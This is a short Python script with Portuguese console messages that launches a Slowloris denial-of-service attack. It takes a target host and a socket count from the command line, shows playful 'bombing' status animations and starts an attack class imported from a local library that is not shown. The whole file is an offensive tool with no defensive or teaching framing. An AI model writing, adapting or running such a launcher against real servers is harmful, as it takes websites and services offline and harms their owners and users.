#!/usr/bin/env python3

import sys
from time import sleep
from rich.console import Console
from lib import HostAddress, SlowLorisAttack
from lib import logo

console = Console()

try:
  url = HostAddress.from_url(f"http://{sys.argv[1]}")
  sockets_c = int(sys.argv[2])


  dd_attack = SlowLorisAttack(url, sockets_c, silent=True)

  with console.status(f"[bold blue]Subindo [green]{sys.argv[2]}[/] boots.[/]") as status:
    sleep(3)
    console.log(f"[bold green]{sys.argv[2]}[/] Boots prontos!")
    sleep(1)
    status.update(status=(f"[bold yellow]Apontando para o alvo [green]{sys.argv[1]}[/][/]"), spinner="bouncingBall", spinner_style="yellow")
    sleep(3)
    console.log("Alvo Lockado")
    sleep(1)
    status.update(status=(f" [bold magenta]  Bombardeando [bold green]{sys.argv[1]}[/][/]"), spinner="grenade", spinner_style="red")
    dd_attack.start()

except KeyboardInterrupt:
    print (" Mas já?? :( ")
    exit(0)
